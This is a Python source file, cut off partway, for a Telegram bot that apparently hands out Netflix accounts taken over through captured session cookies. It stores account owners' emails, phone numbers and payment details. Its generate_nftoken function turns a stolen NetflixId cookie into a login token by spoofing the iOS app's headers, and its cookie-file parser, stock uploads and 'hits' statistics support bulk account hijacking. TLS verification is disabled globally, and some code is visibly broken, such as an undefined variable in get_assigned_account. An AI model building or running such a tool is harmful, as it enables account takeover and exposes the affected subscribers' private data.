import sys
import asyncio
import json
import os
import re
import random
import string
import time
import ssl
import sqlite3
import threading
import zipfile
import io
import shutil
import html
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

if sys.platform == "win32":
    try:
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding='utf-8')
        if hasattr(sys.stderr, "reconfigure"):
            sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    asyncio.get_running_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

ssl._create_default_https_context = ssl._create_unverified_context

# ============================================================
# IMPORT LIBSQL
# ============================================================
HAS_LIBSQL = False
try:
    import libsql_experimental as libsql
    HAS_LIBSQL = True
    print("✅ libsql-experimental loaded")
except ImportError:
    try:
        import libsql
        HAS_LIBSQL = True
        print("✅ libsql loaded")
    except ImportError:
        print("❌ No libsql library found. Using SQLite fallback.")

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ChatMember, InputFile
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from flask import Flask, jsonify

# ============================================================
# FLASK KEEPALIVE & HEALTHCHECK SERVER
# ============================================================
app = Flask(__name__)

@app.route("/")
@app.route("/health")
def health_check():
    return jsonify({
        "status": "online",
        "service": "Senzo Netflix Bot",
        "database": "Turso" if db.use_turso else "SQLite",
        "developer": "@Senzo268",
        "timestamp": datetime.utcnow().isoformat()
    }), 200

def start_health_server():
    port = int(os.getenv("PORT", 8080))
    try:
        import logging as fl_log
        fl_log.getLogger('werkzeug').setLevel(fl_log.ERROR)
        print(f"🌐 Railway Health Check server running on 0.0.0.0:{port}")
        app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
    except Exception as e:
        logger.error(f"Health server error: {e}")

# ============================================================
# ENVIRONMENT VARIABLES
# ============================================================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
TURSO_DATABASE_URL = os.getenv("TURSO_DATABASE_URL", "")
TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN", "")
REPORT_CHANNEL_ID = os.getenv("REPORT_CHANNEL_ID", "")

admin_ids_str = os.getenv("ADMIN_IDS", "")
ADMIN_IDS = [int(aid.strip()) for aid in admin_ids_str.split(",") if aid.strip().isdigit()]

WORKING_COOLDOWN_MINUTES = int(os.getenv("COOLDOWN_MINUTES", 5))
MAX_ACCOUNTS_PER_USER = int(os.getenv("MAX_ACCOUNTS", 5))
MAX_CHECK_THREADS = int(os.getenv("MAX_THREADS", 20))
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", 20))
MAX_RETRIES = int(os.getenv("MAX_RETRIES", 3))

logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# DATABASE MANAGEMENT (THREAD-SAFE)
# ============================================================
class Database:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialize()
        return cls._instance
    
    def _initialize(self):
        self.use_turso = False
        self.conn = None
        self.db_lock = threading.Lock()
        
        if HAS_LIBSQL and TURSO_DATABASE_URL and TURSO_DATABASE_URL.startswith("libsql://"):
            try:
                print(f"🔄 Connecting to Turso: {TURSO_DATABASE_URL}")
                if TURSO_AUTH_TOKEN:
                    self.conn = libsql.connect(TURSO_DATABASE_URL, auth_token=TURSO_AUTH_TOKEN)
                else:
                    self.conn = libsql.connect(TURSO_DATABASE_URL)
                self.use_turso = True
                print("✅ Turso connection successful!")
                self._init_tables()
                return
            except Exception as e:
                print(f"⚠️ Turso connection failed: {e}")
                self.use_turso = False
        
        try:
            self.conn = sqlite3.connect("bot.db", check_same_thread=False)
            print("✅ Using SQLite database (fallback)")
            self._init_tables()
        except Exception as e:
            print(f"❌ Database error: {e}")
            raise
    
    def _init_tables(self):
        with self.db_lock:
            cur = self.conn.cursor()
            cur.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    is_banned BOOLEAN DEFAULT 0,
                    is_admin BOOLEAN DEFAULT 0,
                    last_account_time TIMESTAMP,
                    total_working INT DEFAULT 0,
                    total_notworking INT DEFAULT 0,
                    working_reports INT DEFAULT 0,
                    notworking_reports INT DEFAULT 0,
                    accounts_used INT DEFAULT 0,
                    pending_report BOOLEAN DEFAULT 0,
                    pending_report_account_id INTEGER,
                    pending_report_type TEXT,
                    warnings INT DEFAULT 0
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS accounts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT,
                    country TEXT,
                    plan TEXT,
                    cookies TEXT,
                    nftoken TEXT,
                    nftoken_expiry TEXT,
                    assigned_to INTEGER,
                    assigned_at TIMESTAMP,
                    is_working BOOLEAN DEFAULT 1,
                    status TEXT DEFAULT 'available',
                    source_file TEXT,
                    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_checked TIMESTAMP,
                    report_count INT DEFAULT 0,
                    account_name TEXT,
                    streams INT,
                    quality TEXT,
                    price TEXT,
                    billing_date TEXT,
                    member_since TEXT,
                    payment_method TEXT,
                    card_last4 TEXT,
                    phone TEXT,
                    extra_member BOOLEAN DEFAULT 0,
                    membership_status TEXT,
                    email_verified BOOLEAN DEFAULT 0,
                    profiles TEXT,
                    user_guid TEXT,
                    working_confirmed BOOLEAN DEFAULT 0
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS reports (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    account_id INTEGER,
                    report_type TEXT,
                    screenshot_file_id TEXT,
                    status TEXT DEFAULT 'pending',
                    reported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    reviewed_at TIMESTAMP,
                    admin_note TEXT,
                    admin_id INTEGER,
                    channel_post_id INTEGER
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS messages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    message TEXT,
                    admin_reply TEXT,
                    status TEXT DEFAULT 'pending',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    replied_at TIMESTAMP
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS channels (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    channel_id TEXT UNIQUE,
                    channel_name TEXT,
                    invite_link TEXT,
                    is_active BOOLEAN DEFAULT 1
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS stock_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    admin_id INTEGER,
                    file_name TEXT,
                    total_found INT,
                    valid_found INT,
                    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS stats (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    date DATE UNIQUE,
                    total_hits INT DEFAULT 0,
                    total_free INT DEFAULT 0,
                    total_bad INT DEFAULT 0
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS ban_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    admin_id INTEGER,
                    reason TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS warning_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    admin_id INTEGER,
                    reason TEXT,
                    warning_number INT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            self.conn.commit()
            print("✅ Database tables initialized")
    
    def execute(self, query, params=None):
        with self.db_lock:
            cur = self.conn.cursor()
            if params:
                cur.execute(query, params)
            else:
                cur.execute(query)
            return cur
    
    def executemany(self, query, params_list):
        with self.db_lock:
            cur = self.conn.cursor()
            cur.executemany(query, params_list)
            return cur
    
    def commit(self):
        with self.db_lock:
            self.conn.commit()
    
    def close(self):
        with self.db_lock:
            self.conn.close()

db = Database()

# ============================================================
# SAFE HELPERS & HTML ESCAPING
# ============================================================

def safe_str(value, default="Unknown"):
    if value is None:
        return default
    s = str(value).strip()
    return s if s else default

def safe_int(value, default=0):
    try:
        return int(value)
    except (ValueError, TypeError):
        return default

def safe_bool(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return bool(value)
    if isinstance(value, str):
        return value.lower() in ("true", "yes", "1", "on", "t")
    return False

def h(text: Any) -> str:
    """Safely escape HTML string for Telegram HTML ParseMode."""
    return html.escape(safe_str(text, default=""))

async def send_or_edit(update: Update, text: str, reply_markup=None, parse_mode=ParseMode.HTML):
    """Universal message helper that handles callback queries and direct messages gracefully."""
    try:
        if update.callback_query:
            query = update.callback_query
            try:
                await query.answer()
            except Exception:
                pass
            try:
                return await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
            except Exception as e:
                if "Message is not modified" in str(e):
                    return query.message
                if query.message:
                    return await query.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        elif update.message:
            return await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"Error in send_or_edit: {e}")
    return None

# ============================================================
# NFTOKEN GENERATOR
# ============================================================
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def generate_nftoken(netflix_id: str, attempts: int = 3):
    if not netflix_id:
        return None, None
    for attempt in range(attempts):
        try:
            headers = dict(NFTOKEN_HEADERS)
            headers["Cookie"] = f"NetflixId={netflix_id}"
            headers["x-netflix.request.attempt"] = str(attempt + 1)
            response = requests.get(
                NFTOKEN_API_URL,
                params=NFTOKEN_QUERY_PARAMS,
                headers=headers,
                timeout=20,
                verify=False
            )
            if response.status_code == 200:
                data = response.json()
                token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
                token = token_data.get("token")
                expires = token_data.get("expires")
                if token:
                    return token, expires
            time.sleep(0.3)
        except Exception as e:
            logger.debug(f"NFToken attempt {attempt+1} failed: {e}")
            time.sleep(0.3)
    return None, None

# ============================================================
# DATABASE HELPERS
# ============================================================

def get_user(user_id: int) -> Dict:
    try:
        cur = db.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = cur.fetchone()
        if row:
            return {
                "user_id": row[0], "username": safe_str(row[1]), "first_name": safe_str(row[2]),
                "joined_at": safe_str(row[3]), "is_banned": safe_bool(row[4]), "is_admin": safe_bool(row[5]),
                "last_account_time": safe_str(row[6]), "total_working": safe_int(row[7]),
                "total_notworking": safe_int(row[8]), "working_reports": safe_int(row[9]),
                "notworking_reports": safe_int(row[10]), "accounts_used": safe_int(row[11]),
                "pending_report": safe_bool(row[12]), "pending_report_account_id": safe_int(row[13]),
                "pending_report_type": safe_str(row[14]), "warnings": safe_int(row[15]),
            }
    except Exception as e:
        logger.error(f"Error in get_user: {e}")
    return {
        "user_id": user_id, "username": "", "first_name": "",
        "joined_at": "", "is_banned": False, "is_admin": False,
        "last_account_time": "", "total_working": 0, "total_notworking": 0,
        "working_reports": 0, "notworking_reports": 0, "accounts_used": 0,
        "pending_report": False, "pending_report_account_id": 0,
        "pending_report_type": "", "warnings": 0,
    }

def find_user_by_query(query_str: str) -> Optional[Dict]:
    try:
        q = query_str.strip().lstrip('@')
        if q.isdigit():
            return get_user(int(q))
        cur = db.execute('SELECT user_id FROM users WHERE LOWER(username) = LOWER(?)', (q,))
        row = cur.fetchone()
        if row:
            return get_user(row[0])
    except Exception as e:
        logger.error(f"Error in find_user_by_query: {e}")
    return None

def create_user(user_id: int, username: str, first_name: str):
    try:
        is_admin = 1 if user_id in ADMIN_IDS else 0
        db.execute('''
            INSERT OR IGNORE INTO users (user_id, username, first_name, is_admin, pending_report, warnings)
            VALUES (?, ?, ?, ?, 0, 0)
        ''', (user_id, safe_str(username), safe_str(first_name), is_admin))
        db.commit()
    except Exception as e:
        logger.error(f"Error in create_user: {e}")

def get_all_users() -> List[Dict]:
    try:
        cur = db.execute('SELECT user_id, username, first_name, is_banned, warnings, accounts_used FROM users ORDER BY joined_at DESC')
        rows = cur.fetchall()
        return [
            {
                "user_id": r[0], "username": safe_str(r[1]), "first_name": safe_str(r[2]),
                "is_banned": safe_bool(r[3]), "warnings": safe_int(r[4]), "accounts_used": safe_int(r[5])
            }
            for r in rows
        ]
    except Exception as e:
        logger.error(f"Error in get_all_users: {e}")
        return []

def get_available_accounts(plan_filter: Optional[str] = None) -> List[Dict]:
    try:
        if plan_filter:
            cur = db.execute('''
                SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry, status,
                       account_name, streams, quality, price, billing_date, member_since,
                       payment_method, card_last4, phone, extra_member, profiles, user_guid
                FROM accounts WHERE status = 'available' AND is_working = 1 AND UPPER(plan) = UPPER(?) ORDER BY id ASC
            ''', (plan_filter,))
        else:
            cur = db.execute('''
                SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry, status,
                       account_name, streams, quality, price, billing_date, member_since,
                       payment_method, card_last4, phone, extra_member, profiles, user_guid
                FROM accounts WHERE status = 'available' AND is_working = 1 ORDER BY id ASC
            ''')
        rows = cur.fetchall()
        return [
            {
                "id": r[0], "email": safe_str(r[1]), "country": safe_str(r[2]), "plan": safe_str(r[3]),
                "cookies": safe_str(r[4]), "nftoken": safe_str(r[5]), "nftoken_expiry": safe_str(r[6]),
                "status": safe_str(r[7]), "account_name": safe_str(r[8]), "streams": safe_int(r[9]),
                "quality": safe_str(r[10]), "price": safe_str(r[11]), "billing_date": safe_str(r[12]),
                "member_since": safe_str(r[13]), "payment_method": safe_str(r[14]),
                "card_last4": safe_str(r[15]), "phone": safe_str(r[16]), "extra_member": safe_bool(r[17]),
                "profiles": safe_str(r[18]), "user_guid": safe_str(r[19]),
            }
            for r in rows
        ]
    except Exception as e:
        logger.error(f"Error in get_available_accounts: {e}")
        return []

def get_total_accounts() -> Dict:
    try:
        cur = db.execute('SELECT COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1')
        total = cur.fetchone()[0] or 0
        cur = db.execute('SELECT plan, COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1 GROUP BY plan')
        plan_counts = {safe_str(r[0]): safe_int(r[1]) for r in cur.fetchall()}
        return {"total": total, "plans": plan_counts}
    except Exception as e:
        logger.error(f"Error in get_total_accounts: {e}")
        return {"total": 0, "plans": {}}

def assign_account(user_id: int) -> Optional[Dict]:
    try:
        accounts = get_available_accounts()
        if not accounts:
            return None
        account = accounts[0]
        db.execute('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE assigned_to = ?', (user_id,))
        cur = db.execute('''
            UPDATE accounts 
            SET assigned_to = ?, assigned_at = CURRENT_TIMESTAMP, status = 'assigned' 
            WHERE id = ? AND status = 'available'
        ''', (user_id, account["id"]))
        if cur.rowcount > 0:
            db.execute('''
                UPDATE users 
                SET last_account_time = CURRENT_TIMESTAMP, accounts_used = accounts_used + 1
                WHERE user_id = ?
            ''', (user_id,))
            db.commit()
            return account
        db.commit()
        return None
    except Exception as e:
        logger.error(f"Error in assign_account: {e}")
        return None

def get_assigned_account(user_id: int) -> Optional[Dict]:
    try:
        cur = db.execute('''
            SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry,
                   account_name, streams, quality, price, billing_date, member_since,
                   payment_method, card_last4, phone, extra_member, profiles, user_guid
            FROM accounts WHERE assigned_to = ? AND status = 'assigned' ORDER BY assigned_at DESC LIMIT 1
        ''', (user_id,))
        row = cur.fetchone()
        if row:
            return {
                "id": r[0], "email": safe_str(r[1]), "country": safe_str(r[2]), "plan": safe_str(r[3]),
                "cookies": safe_str(r[4]), "nftoken": safe_str(r[5]), "nftoken_expiry": safe_str(r[6]),
                "account_name": safe_str(r[7]), "streams": safe_int(r[8]), "quality": safe_str(r[9]),
                "price": safe_str(r[10]), "billing_date": safe_str(r[11]), "member_since": safe_str(r[12]),
                "payment_method": safe_str(r[13]), "card_last4": safe_str(r[14]), "phone": safe_str(r[15]),
                "extra_member": safe_bool(r[16]), "profiles": safe_str(r[17]), "user_guid": safe_str(r[18]),
            }
    except Exception as e:
        logger.error(f"Error in get_assigned_account: {e}")
    return None

def release_account(account_id: int):
    try:
        db.execute('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE id = ?', (account_id,))
        db.commit()
    except Exception as e:
        logger.error(f"Error in release_account: {e}")

def delete_account(account_id: int) -> bool:
    try:
        db.execute('DELETE FROM accounts WHERE id = ?', (account_id,))
        db.commit()
        return True
    except Exception as e:
        logger.error(f"Error in delete_account: {e}")
        return False

def clear_all_accounts(plan_filter: Optional[str] = None) -> int:
    try:
        if plan_filter:
            cur = db.execute('DELETE FROM accounts WHERE UPPER(plan) = UPPER(?)', (plan_filter,))
        else:
            cur = db.execute('DELETE FROM accounts')
        db.commit()
        return cur.rowcount
    except Exception as e:
        logger.error(f"Error in clear_all_accounts: {e}")
        return 0

def can_get_account(user_id: int) -> Tuple[bool, str]:
    user = get_user(user_id)
    if safe_bool(user.get("is_banned")):
        return False, "🚫 You are banned from using this bot."
    
    last_time = user.get("last_account_time")
    if last_time:
        try:
            time_str = str(last_time).split('.')[0].replace('T', ' ')
            last_dt = datetime.strptime(time_str, "%Y-%m-%d %H:%M:%S")
            diff = datetime.utcnow() - last_dt
            cooldown_seconds = WORKING_COOLDOWN_MINUTES * 60
            if diff.total_seconds() < cooldown_seconds:
                remaining = int((cooldown_seconds - diff.total_seconds()) / 60) + 1
                return False, f"⏳ Cooldown active! Please wait {remaining} minute(s) before requesting another account."
        except Exception as e:
            logger.debug(f"Time parse error in cooldown: {e}")
            
    if safe_int(user.get("accounts_used")) >= MAX_ACCOUNTS_PER_USER and user_id not in ADMIN_IDS:
        return False, f"⚠️ Account limit reached! You have used the maximum allowed ({MAX_ACCOUNTS_PER_USER}) accounts."
        
    return True, ""

# ============================================================
# FIXED: save_account_batch - PROPER DATABASE SAVE
# ============================================================
def save_account_batch(accounts: List[Dict]) -> int:
    """Save accounts to database with proper row count tracking."""
    if not accounts:
        return 0
    
    try:
        # Ensure database connection is active
        db.execute("SELECT 1")
        
        query = '''
            INSERT INTO accounts (
                email, country, plan, cookies, nftoken, nftoken_expiry,
                source_file, last_checked, account_name, streams, quality,
                price, billing_date, member_since, payment_method, card_last4,
                phone, extra_member, membership_status, email_verified,
                profiles, user_guid
            ) VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        '''
        
        params_list = [
            (
                safe_str(a.get("email")),
                safe_str(a.get("country")),
                safe_str(a.get("plan")),
                safe_str(a.get("cookies")),
                safe_str(a.get("nftoken")),
                safe_str(a.get("nftoken_expiry")),
                safe_str(a.get("source_file")),
                safe_str(a.get("account_name")),
                safe_int(a.get("streams")),
                safe_str(a.get("quality")),
                safe_str(a.get("price")),
                safe_str(a.get("billing_date")),
                safe_str(a.get("member_since")),
                safe_str(a.get("payment_method")),
                safe_str(a.get("card_last4")),
                safe_str(a.get("phone")),
                1 if safe_bool(a.get("extra_member")) else 0,
                safe_str(a.get("membership_status")),
                1 if safe_bool(a.get("email_verified")) else 0,
                safe_str(a.get("profiles")),
                safe_str(a.get("user_guid")),
            )
            for a in accounts
        ]
        
        cur = db.executemany(query, params_list)
        db.commit()
        saved = cur.rowcount
        
        logger.info(f"✅ Successfully saved {saved} accounts to database")
        return saved
        
    except Exception as e:
        logger.error(f"❌ Error in save_account_batch: {e}")
        # Try one by one if batch fails
        saved = 0
        for a in accounts:
            try:
                query = '''
                    INSERT INTO accounts (
                        email, country, plan, cookies, nftoken, nftoken_expiry,
                        source_file, last_checked, account_name, streams, quality,
                        price, billing_date, member_since, payment_method, card_last4,
                        phone, extra_member, membership_status, email_verified,
                        profiles, user_guid
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                '''
                params = (
                    safe_str(a.get("email")), safe_str(a.get("country")), safe_str(a.get("plan")),
                    safe_str(a.get("cookies")), safe_str(a.get("nftoken")), safe_str(a.get("nftoken_expiry")),
                    safe_str(a.get("source_file")), safe_str(a.get("account_name")), safe_int(a.get("streams")),
                    safe_str(a.get("quality")), safe_str(a.get("price")), safe_str(a.get("billing_date")),
                    safe_str(a.get("member_since")), safe_str(a.get("payment_method")), safe_str(a.get("card_last4")),
                    safe_str(a.get("phone")), 1 if safe_bool(a.get("extra_member")) else 0,
                    safe_str(a.get("membership_status")), 1 if safe_bool(a.get("email_verified")) else 0,
                    safe_str(a.get("profiles")), safe_str(a.get("user_guid")),
                )
                cur = db.execute(query, params)
                db.commit()
                if cur.rowcount > 0:
                    saved += 1
            except Exception as e2:
                logger.error(f"❌ Failed to save account {a.get('email')}: {e2}")
        
        logger.info(f"✅ Saved {saved} accounts one by one")
        return saved

def log_stock(admin_id: int, file_name: str, total: int, valid: int):
    try:
        db.execute('INSERT INTO stock_logs (admin_id, file_name, total_found, valid_found) VALUES (?, ?, ?, ?)',
                   (admin_id, file_name, total, valid))
        db.commit()
    except Exception as e:
        logger.error(f"Error in log_stock: {e}")

def log_daily_stats(hits: int = 0, free: int = 0, bad: int = 0):
    try:
        cur = db.execute('SELECT id FROM stats WHERE date = CURRENT_DATE')
        row = cur.fetchone()
        if row:
            db.execute('''
                UPDATE stats 
                SET total_hits = total_hits + ?, total_free = total_free + ?, total_bad = total_bad + ?
                WHERE date = CURRENT_DATE
            ''', (hits, free, bad))
        else:
            db.execute('''
                INSERT INTO stats (date, total_hits, total_free, total_bad)
                VALUES (CURRENT_DATE, ?, ?, ?)
            ''', (hits, free, bad))
        db.commit()
    except Exception as e:
        logger.error(f"Error in log_daily_stats: {e}")

def update_report_channel_post(report_id: int, channel_post_id: int):
    try:
        db.execute('UPDATE reports SET channel_post_id = ? WHERE id = ?', (channel_post_id, report_id))
        db.commit()
    except Exception as e:
        logger.error(f"Error in update_report_channel_post: {e}")

def confirm_account_working(account_id: int, report_id: int, admin_id: int) -> bool:
    try:
        db.execute('UPDATE accounts SET is_working = 1, status = "available", working_confirmed = 1 WHERE id = ?', (account_id,))
        db.execute('UPDATE reports SET status = "accepted", reviewed_at = CURRENT_TIMESTAMP, admin_id = ? WHERE id = ?', (admin_id, report_id))
        db.commit()
        return True
    except Exception as e:
        logger.error(f"Error in confirm_account_working: {e}")
        return False

def add_warning(user_id: int, admin_id: int, reason: str) -> int:
    try:
        cur = db.execute('SELECT warnings FROM users WHERE user_id = ?', (user_id,))
        row = cur.fetchone()
        warnings = row[0] + 1 if row else 1
        db.execute('UPDATE users SET warnings = ? WHERE user_id = ?', (warnings, user_id))
        db.execute('''
            INSERT INTO warning_logs (user_id, admin_id, reason, warning_number)
            VALUES (?, ?, ?, ?)
        ''', (user_id, admin_id, reason, warnings))
        db.commit()
        return warnings
    except Exception as e:
        logger.error(f"Error in add_warning: {e}")
        return 0

def ban_user_from_bot(user_id: int, admin_id: int, reason: str) -> bool:
    try:
        db.execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (user_id,))
        db.execute('''
            INSERT INTO ban_logs (user_id, admin_id, reason)
            VALUES (?, ?, ?)
        ''', (user_id, admin_id, reason))
        db.commit()
        return True
    except Exception as e:
        logger.error(f"Error in ban_user_from_bot: {e}")
        return False

def unban_user_from_bot(user_id: int, admin_id: int) -> bool:
    try:
        db.execute('UPDATE users SET is_banned = 0, warnings = 0 WHERE user_id = ?', (user_id,))
        db.commit()
        return True
    except Exception as e:
        logger.error(f"Error in unban_user_from_bot: {e}")
        return False

def get_banned_users() -> List[Tuple]:
    try:
        cur = db.execute('SELECT user_id, username, first_name FROM users WHERE is_banned = 1')
        return cur.fetchall()
    except Exception as e:
        logger.error(f"Error in get_banned_users: {e}")
        return []

def get_pending_reports() -> List[Dict]:
    try:
        cur = db.execute('''
            SELECT r.id, r.user_id, r.account_id, r.report_type, r.screenshot_file_id, r.reported_at, u.username, a.email
            FROM reports r
            LEFT JOIN users u ON r.user_id = u.user_id
            LEFT JOIN accounts a ON r.account_id = a.id
            WHERE r.status = 'pending' ORDER BY r.id DESC
        ''')
        rows = cur.fetchall()
        return [
            {
                "id": r[0], "user_id": r[1], "account_id": r[2], "report_type": safe_str(r[3]),
                "screenshot": safe_str(r[4]), "time": safe_str(r[5]), "username": safe_str(r[6]), "email": safe_str(r[7])
            }
            for r in rows
        ]
    except Exception as e:
        logger.error(f"Error in get_pending_reports: {e}")
        return []

def get_stock_logs_history() -> List[Dict]:
    try:
        cur = db.execute('SELECT id, admin_id, file_name, total_found, valid_found, uploaded_at FROM stock_logs ORDER BY id DESC LIMIT 15')
        rows = cur.fetchall()
        return [
            {
                "id": r[0], "admin_id": r[1], "file_name": safe_str(r[2]),
                "total": safe_int(r[3]), "valid": safe_int(r[4]), "time": safe_str(r[5])
            }
            for r in rows
        ]
    except Exception as e:
        logger.error(f"Error in get_stock_logs_history: {e}")
        return []

# ============================================================
# COOKIE EXTRACTION & CHECKING
# ============================================================

def extract_cookie_pairs(content: str) -> List[Tuple[str, Optional[str]]]:
    pairs = []
    seen = set()
    
    # 1. Try parsing JSON format first
    try:
        data = json.loads(content)
        cookies = []
        if isinstance(data, list):
            cookies = data
        elif isinstance(data, dict):
            cookies = data.get("cookies", [])
            
        nid = None
        sid = None
        for cookie in cookies:
            if isinstance(cookie, dict):
                cname = cookie.get("name")
                cval = safe_str(cookie.get("value"))
                if cname == "NetflixId":
                    nid = cval
                elif cname == "SecureNetflixId":
                    sid = cval
        if nid and nid not in seen:
            seen.add(nid)
            pairs.append((nid, sid))
